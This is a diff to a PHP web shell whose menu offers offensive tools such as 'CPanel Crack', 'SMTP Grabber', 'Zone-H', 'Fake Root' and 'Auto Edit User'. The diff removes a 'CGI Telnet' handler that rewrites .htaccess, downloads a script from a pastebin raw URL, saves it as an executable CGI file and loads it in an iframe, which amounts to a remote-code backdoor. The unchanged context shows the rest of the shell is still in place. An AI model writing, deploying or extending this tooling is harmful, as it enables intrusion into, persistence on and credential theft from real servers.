@@ -373,8 +373,7 @@ echo "<li>[ <a href='?dir=$dir&do=jumping'>Jumping</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=cpanel'>CPanel Crack</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=zoneh'>Zone-H</a> ]</li>";
-echo "<li>[ <a href='?dir=$dir&do=cgi'>CGI Telnet</a> ]</li>";
-echo "<li>[ <a href='?dir=$dir&do=network'>network</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&do=network'>Network</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=adminer'>Adminer</a> ]</li><br>";
 echo "<li>[ <a href='?dir=$dir&do=fake_root'>Fake Root</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> ]</li>";
@@ -1275,19 +1274,6 @@ if($_GET['logout'] == true) {
 		</form>";
 	}
 	echo "</center>";
-} elseif($_GET['do'] == 'cgi') {
-	$cgi_dir = mkdir('idx_cgi', 0755);
-	$file_cgi = "idx_cgi/cgi.izo";
-	$isi_htcgi = "AddHandler cgi-script .izo";
-	$htcgi = fopen(".htaccess", "w");
-	fwrite($htcgi, $isi_htcgi);
-	fclose($htcgi);
-	$cgi_script = getsource("http://pastebin.com/raw/Lj46KxFT");
-	$cgi = fopen($file_cgi, "w");
-	fwrite($cgi, $cgi_script);
-	fclose($cgi);
-	chmod($file_cgi, 0755);
-	echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
 } elseif($_GET['do'] == 'fake_root') {
 	ob_start();
 	$cwd = getcwd();
